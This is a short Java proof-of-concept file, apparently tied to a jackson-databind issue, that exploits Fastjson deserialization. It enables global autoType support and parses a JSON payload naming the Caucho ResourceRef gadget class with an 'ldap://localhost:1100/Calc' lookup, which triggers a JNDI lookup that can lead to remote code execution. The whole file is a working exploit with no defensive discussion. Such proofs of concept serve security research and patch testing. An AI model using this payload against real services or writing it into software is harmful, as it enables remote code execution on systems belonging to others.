import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.fasterxml.jackson.core.JsonProcessingException;

/**
 * Title: FastjsonMain
 * Descrption: https://github.com/FasterXML/jackson-databind/issues/2660
 * Date:2020/3/23 4:32 下午
 * Email:woo0nise@gmail.com
 * Company:www.j2ee.app
 *
 * @author R4v3zn
 * @version 1.0.0
 */
public class FastjsonMain {

    public static void main(String[] args) throws JsonProcessingException {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://localhost:1100/Calc\"}";
        JSON.parseObject(payload);
    }
}
